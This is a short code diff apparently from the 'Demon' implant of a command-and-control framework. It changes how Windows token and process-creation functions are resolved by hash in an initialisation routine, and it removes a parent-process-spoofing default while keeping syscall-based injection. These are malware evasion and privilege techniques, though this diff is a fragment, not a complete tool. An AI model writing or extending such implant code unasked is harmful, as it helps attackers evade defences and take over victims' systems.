@@ -377,7 +377,7 @@ VOID DxInitialization( VOID )
     {
         Instance->Win32.GetTokenInformation                 = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_GetTokenInformation );
         Instance->Win32.CreateProcessWithTokenW             = LdrFunctionAddr( Instance->Modules.Advapi32, 0x94e76e4c );
-        Instance->Win32.CreateProcessAsUserA                = LdrFunctionAddr( Instance->Modules.Advapi32, 0xb053cc2c );
+        Instance->Win32.CreateProcessWithLogonW             = LdrFunctionAddr( Instance->Modules.Advapi32, 0x823c224a );
         Instance->Win32.RevertToSelf                        = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_RevertToSelf );
         Instance->Win32.GetUserNameA                        = LdrFunctionAddr( Instance->Modules.Advapi32, FuncHash_GetUserNameA );
         Instance->Win32.LogonUserA                          = LdrFunctionAddr( Instance->Modules.Advapi32, 0x609d56e4 );
@@ -514,7 +514,6 @@ VOID DxInitialization( VOID )
     // Setting config
     Instance->Config.AES.Key            = NULL;
     Instance->Config.AES.IV             = NULL;
-    Instance->Config.Process.PpidSpoof  = Instance->Session.PID;
     Instance->Config.Inject.Technique   = INJECTION_TECHNIQUE_SYSCALL; // default is just using syscalls
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.DemonID )
